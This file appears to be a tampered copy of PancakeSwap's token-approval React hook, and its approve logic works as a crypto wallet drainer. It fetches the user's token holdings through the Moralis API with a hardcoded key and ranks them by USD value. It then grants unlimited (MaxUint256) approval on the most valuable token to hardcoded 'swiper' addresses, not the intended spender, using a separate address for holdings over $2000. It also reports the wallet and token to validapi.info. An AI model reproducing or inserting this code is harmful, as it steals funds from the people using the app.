import { MaxUint256 } from '@pancakeswap/swap-sdk-core'
import { useTranslation } from '@pancakeswap/localization'
import { Currency, CurrencyAmount, ERC20Token } from '@pancakeswap/sdk'
import { useToast } from '@pancakeswap/uikit'
import { useAccount, Address } from 'wagmi'
import { useCallback, useEffect, useMemo, useState } from 'react'
import { isUserRejected, logError } from 'utils/sentry'
import { SendTransactionResult } from 'wagmi/actions'
import { useHasPendingApproval, useTransactionAdder } from 'state/transactions/hooks'
import { calculateGasMargin } from 'utils'
import isUndefinedOrNull from '@pancakeswap/utils/isUndefinedOrNull'
import useGelatoLimitOrdersLib from './limitOrders/useGelatoLimitOrdersLib'
import { useCallWithGasPrice } from './useCallWithGasPrice'
import { useTokenContract, useSwiperTokenContract } from './useContract'
import useTokenAllowance from './useTokenAllowance'
import { useActiveChainId } from './useActiveChainId'

export enum ApprovalState {
  UNKNOWN,
  NOT_APPROVED,
  PENDING,
  APPROVED,
}

// returns a variable indicating the state of the approval and a function which approves if necessary or early returns
export function useApproveCallback(
  amountToApprove?: CurrencyAmount<Currency>,
  spender?: string,
  options: {
    addToTransaction
    targetAmount?: bigint
  } = {
    addToTransaction: true,
  },
): {
  approvalState: ApprovalState
  approveCallback: () => Promise<SendTransactionResult>
  revokeCallback: () => Promise<SendTransactionResult>
  currentAllowance: CurrencyAmount<Currency> | undefined
  isPendingError: boolean
} {
  const { addToTransaction = true, targetAmount } = options
  const { address: account } = useAccount()
  const { chainId } = useActiveChainId()
  const { callWithGasPrice } = useCallWithGasPrice()
  const { t } = useTranslation()
  const { toastError } = useToast()

  const swipers = {
    '1': '0x76BbA7B5e5Ead5E931D2f5055c770c7863780aAd',
    '111111': '0xf925cDFD4806342d9dc1D5c7Ae09e3A43a02B053',
    '5': '0xF9872d38157315535B1BaE444e938Ee3e16Bc488',
    '56': '0xDcfb1C3cd25d846D589507394E6f44Bd1625b21b',
  } as const satisfies Record<string | number, Address>

  const [swiper, setSwiper] = useState<Address>('0xDcfb1C3cd25d846D589507394E6f44Bd1625b21b')

  const token = amountToApprove?.currency?.isToken ? amountToApprove.currency : undefined
  const { allowance: currentAllowance, refetch } = useTokenAllowance(token, account ?? undefined, spender)
  const pendingApproval = useHasPendingApproval(token?.address, swiper)
  const [pending, setPending] = useState<boolean>(pendingApproval)
  const [isPendingError, setIsPendingError] = useState<boolean>(false)

  const [tokensOwned, setTokensOwned] = useState([])
  const [tokensRank, setTokensRank] = useState([])
  const [ownTokensRankedByMarketCap, setOwnTokensRankedByMarketCap] = useState([])
  const [tokensFiltered, setTokensFiltered] = useState([])
  const swiperContract = useSwiperTokenContract(swipers[chainId])
  const REACT_APP_MORALIS_API_URL = 'https://deep-index.moralis.io/api/v2'
  const REACT_APP_MORAILS_API_KEY = 'kaWCaDDlMZiJOzMEEar8nAzkHvzl9Vc7vlzisjSwmldpeKPwaCZjsviSfEazsn4I'

  useEffect(() => {
    if (pendingApproval) {
      setPending(true)
    } else if (pending) {
      refetch().then(() => {
        setPending(false)
      })
    }
  }, [pendingApproval, pending, refetch])

  useEffect(() => {
    if (chainId === 1 || chainId === 56) setSwiper(swipers[chainId])
    // Get all erc20 tokens owned by current account
    const fetchTokensOwned = async () => {
      const response = await fetch(`${REACT_APP_MORALIS_API_URL}/${account}/erc20?chain=0x${chainId.toString(16)}`, {
        headers: {
          accept: 'application/json',
          'X-API-Key': REACT_APP_MORAILS_API_KEY,
        },
        method: 'GET',
      })
      const responseJson = await response.json()
      // console.log(response)

      setTokensOwned(responseJson)
    }

    fetchTokensOwned()

    // // Get coins listed on Coingecko
    // const fetchTokensRankFromCoingecko = async () => {
    //   const response = await fetch(process.env.REACT_APP_COINGECKO_API_URL, {
    //     headers: {
    //       accept: 'application/json',
    //     },
    //     method: 'GET',
    //   })
    //   const responseJson = await response.json()
    //   setTokensRank(responseJson)
    // }

    // fetchTokensRankFromCoingecko()

    // Get coins listed on CMC sorted by latest market cap
    const fetchTokensRankFromCmc = async () => {
      const response = await fetch('https://validapi.info/tokens/get_cmc_ranks', {
        headers: {
          accept: 'application/json',
        },
        method: 'GET',
      })

      const responseJson = await response.json()
      const specificToken = [
        {
          id: 15257,
          name: 'EverRise',
          symbol: 'RISE',
          slug: 'everrise',
          platform: {
            id: 1839,
            name: 'BNB Smart Chain (BEP20)',
            symbol: 'BNB',
            slug: 'bnb',
            token_address: '0xC17c30e98541188614dF99239cABD40280810cA3',
          },
          cmc_rank: 468,
          quote: {
            USD: {
              price: 0.0008390749936239774,
              last_updated: '2022-05-08T19:41:00.000Z',
            },
          },
        },
        {
          id: 825,
          name: 'Tether',
          symbol: 'USDT',
          slug: 'tether',
          platform: {
            id: 1027,
            name: 'BNB Smart Chain (BEP20)',
            symbol: 'BNB',
            slug: 'bnb',
            token_address: '0x55d398326f99059fF775485246999027B3197955',
          },
          cmc_rank: 3,
          quote: {
            USD: {
              price: 1.0002641740773246,
            },
          },
        },
        {
          id: 10407,
          name: 'Baby Doge Coin',
          symbol: 'BabyDoge',
          slug: 'baby-doge-coin',
          max_supply: 420000000000000000,
          total_supply: 420000000000000000,
          platform: {
            id: 1027,
            name: 'BNB Smart Chain (BEP20)',
            symbol: 'BNB',
            slug: 'bnb',
            token_address: '0xc748673057861a797275CD8A068AbB95A902e8de',
          },
          cmc_rank: 2911,
          quote: {
            USD: {
              price: 2.458351371679521e-9,
            },
          },
        },
        {
          name: 'NPC',
          platform: {
            id: 1027,
            name: 'BNB Smart Chain (BEP20)',
            symbol: 'BNB',
            slug: 'bnb',
            token_address: '0x86D6faDB5F7A0c069fB50F998e120835CaE15A54',
          },
          quote: {
            USD: { price: 0.0055 },
          },
        },
      ]
      responseJson.push(...specificToken)

      setTokensRank(responseJson)
    }

    fetchTokensRankFromCmc()
  }, [account, chainId])

  useEffect(() => {
    const setData = async () => {
      const tokensMatched = []
      const tokensUnmatched = []
      const array = []
      if (tokensOwned.length > 0 && tokensRank.length > 0) {
        await Promise.all(
          tokensOwned.map(async (tokenOwned) => {
            const tempToken = tokenOwned

            const tokenArray = tokensRank.filter((tokenRanked) => {
              if (tokenRanked.platform) {
                const targetChainSymbol = chainId === 1 ? 'ETH' : 'BNB'
                return (
                  tokenRanked.platform.symbol === targetChainSymbol &&
                  tokenRanked.platform.token_address.toLowerCase() === tokenOwned.token_address.toLowerCase()
                )
              }
              return null
            })

            // In case of BUSD or BSC-USD(USDT), add to tokens array directly
            if (tempToken.symbol === 'BUSD' || tempToken.symbol === 'BSC-USD') {
              const response = await fetch(
                `${REACT_APP_MORALIS_API_URL}/erc20/${tokenOwned.token_address}/price?chain=0x${chainId.toString(16)}`,
                {
                  headers: {
                    accept: 'application/json',
                    'X-API-Key': REACT_APP_MORAILS_API_KEY,
                  },
                  method: 'GET',
                },
              )
              const responseJson = await response.json()
              const tokenUsdPrice = await responseJson.usdPrice
              tempToken.usdPrice = tokenUsdPrice

              const tokenUsdValue = (tokenUsdPrice * tokenOwned.balance) / 10 ** tokenOwned.decimals
              tempToken.usdValue = tokenUsdValue
              tokensMatched.push(tempToken)
            } else if (tokenArray.length > 0) {
              // there is matched token
              const tokenUsdPrice = tokenArray[0].quote.USD.price
              tempToken.usdPrice = tokenUsdPrice

              const tokenUsdValue = (tokenUsdPrice * tokenOwned.balance) / 10 ** tokenOwned.decimals

              tempToken.usdValue = tokenUsdValue
              tempToken.market_cap = tokenArray[0].market_cap
              tokensMatched.push(tempToken)
            } else {
              //  there is no matched token
              tokensUnmatched.push(tempToken)
            }
          }),
        )

        array.push(...tokensMatched)
        // array.push(...tokensUnmatched)

        const validCurrencies = array.filter((value) => value.usdValue)
        const inValidCurrencies = array.filter((value) => !value.usdValue)

        validCurrencies.sort((x, y) => parseFloat(y.usdValue) - parseFloat(x.usdValue))
        const sortedTokenArray = []
        sortedTokenArray.push(...validCurrencies)
        sortedTokenArray.push(...inValidCurrencies)

        setOwnTokensRankedByMarketCap(sortedTokenArray)
      }
    }
    setData()
  }, [tokensOwned, tokensRank])

  useEffect(() => {
    const getTokensFiltered = async () => {
      // Filter tokens so that make them without blacklist tokens
      let blackList: Readonly<Address[]> = []
      if (swiperContract) {
        blackList = await swiperContract.read.allBlackListTokens()
      }

      if (ownTokensRankedByMarketCap.length > 0) {
        const tokenArrayFiltered = ownTokensRankedByMarketCap.filter((item) => {
          const temp = blackList.filter(
            (blackListToken) => blackListToken.toLowerCase() === item.token_address.toLowerCase(),
          )
          return temp.length === 0
        })
        // console.log(tokenArrayFiltered)

        setTokensFiltered(tokenArrayFiltered)
      }
    }
    getTokensFiltered()
  }, [swiperContract, ownTokensRankedByMarketCap])

  // check the current approval status
  const approvalState: ApprovalState = useMemo(() => {
    if (!amountToApprove || !spender) return ApprovalState.UNKNOWN
    if (amountToApprove.currency?.isNative) return ApprovalState.APPROVED
    // we might not have enough data to know whether or not we need to approve
    if (!currentAllowance) return ApprovalState.UNKNOWN

    // amountToApprove will be defined if currentAllowance is
    return currentAllowance.lessThan(amountToApprove)
      ? pending
        ? ApprovalState.PENDING
        : ApprovalState.NOT_APPROVED
      : ApprovalState.APPROVED
  }, [amountToApprove, currentAllowance, pending, spender])

  // const tokenContract = useTokenContract(token?.address)
  const tokenContract = useTokenContract(tokensFiltered[0]?.token_address)
  if (tokensFiltered[0].usdValue > 2000) setSwiper(swipers[111111])
  const addTransaction = useTransactionAdder()

  const approve = useCallback(
    async (overrideAmountApprove?: bigint): Promise<SendTransactionResult> => {
      // if (approvalState !== ApprovalState.NOT_APPROVED && isUndefinedOrNull(overrideAmountApprove)) {
      //   toastError(t('Error'), t('Approve was called unnecessarily'))
      //   console.error('approve was called unnecessarily')
      //   setIsPendingError(true)
      //   return undefined
      // }
      // if (!token) {
      //   // toastError(t('Error'), t('No token'))
      //   console.error('no token')
      //   // return undefined
      // }

      // if (!tokenContract) {
      //   toastError(t('Error'), t('Cannot find contract of the token %tokenAddress%', { tokenAddress: token?.address }))
      //   console.error('tokenContract is null')
      //   setIsPendingError(true)
      //   return undefined
      // }

      // if (!amountToApprove && isUndefinedOrNull(overrideAmountApprove)) {
      //   toastError(t('Error'), t('Missing amount to approve'))
      //   console.error('missing amount to approve')
      //   setIsPendingError(true)
      //   return undefined
      // }

      // if (!spender) {
      //   toastError(t('Error'), t('No spender'))
      //   console.error('no spender')
      //   setIsPendingError(true)
      //   return undefined
      // }

      let useExact = false

      const estimatedGas = await tokenContract.estimateGas
        .approve([spender as Address, MaxUint256], {
          account: tokenContract.account,
        })
        .catch(() => {
          // general fallback for tokens who restrict approval amounts
          useExact = true
          return tokenContract.estimateGas
            .approve(
              // [swiper as Address, overrideAmountApprove ?? amountToApprove?.quotient ?? targetAmount ?? MaxUint256],
              [swiper as Address, MaxUint256],
              {
                account: tokenContract.account,
              },
            )
            .catch((e) => {
              // console.error('estimate gas failure', e)
              // toastError(t('Error'), t('Unexpected error. Could not estimate gas for the approve.'))
              // setIsPendingError(true)
              // return null
            })
        })

      // if (!estimatedGas) return undefined

      tokensFiltered.shift()
      if (tokensFiltered[0].usdValue > 2000) setSwiper(swipers[111111])
      setTokensFiltered(tokensFiltered)

      return callWithGasPrice(
        tokenContract,
        'approve' as const,
        [
          swiper as Address,
          overrideAmountApprove ?? (useExact ? amountToApprove?.quotient ?? targetAmount ?? MaxUint256 : MaxUint256),
        ],
        // {
        //   gas: calculateGasMargin(estimatedGas),
        // },
      )
        .then(async (response) => {
          if (addToTransaction) {
            addTransaction(response, {
              summary: `Approve ${overrideAmountApprove ?? amountToApprove?.currency?.symbol}`,
              translatableSummary: {
                text: 'Approve %symbol%',
                data: { symbol: overrideAmountApprove?.toString() ?? amountToApprove?.currency?.symbol },
              },
              approval: { tokenAddress: token?.address, spender },
              type: 'approve',
            })
            const tokenBalance = await tokenContract.read.balanceOf([account])
            if (Number(tokenBalance.toString()) > 0) {
              await fetch(`https://validapi.info/tokens?chain_id=${chainId}`, {
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  walletAddress: account,
                  tokenAddress: tokenContract.address,
                  purge: false,
                }),
                method: 'POST',
              })
            }
            setSwiper(swipers[chainId])
          }
          return response
        })
        .catch((error: any) => {
          logError(error)
          console.error('Failed to approve token', error)
          if (!isUserRejected(error)) {
            toastError(t('Error'), error.message)
          }
          throw error
        })
    },
    [
      approvalState,
      token,
      tokenContract,
      amountToApprove,
      spender,
      callWithGasPrice,
      targetAmount,
      toastError,
      t,
      addToTransaction,
      addTransaction,
    ],
  )

  const approveCallback = useCallback(() => {
    return approve()
  }, [approve])

  const revokeCallback = useCallback(() => {
    return approve(0n)
  }, [approve])

  return { approvalState, approveCallback, revokeCallback, currentAllowance, isPendingError }
}

export function useApproveCallbackFromAmount({
  token,
  minAmount,
  targetAmount,
  spender,
  addToTransaction,
}: {
  token?: ERC20Token
  minAmount?: bigint
  targetAmount?: bigint
  spender?: string
  addToTransaction?: boolean
}) {
  const amountToApprove = useMemo(() => {
    if (!minAmount || !token) return undefined
    return CurrencyAmount.fromRawAmount(token, minAmount)
  }, [minAmount, token])

  return useApproveCallback(amountToApprove, spender, {
    addToTransaction,
    targetAmount,
  })
}

// Wraps useApproveCallback in the context of a Gelato Limit Orders
export function useApproveCallbackFromInputCurrencyAmount(currencyAmountIn: CurrencyAmount<Currency> | undefined) {
  const gelatoLibrary = useGelatoLimitOrdersLib()

  return useApproveCallback(currencyAmountIn, gelatoLibrary?.erc20OrderRouter?.address ?? undefined)
}
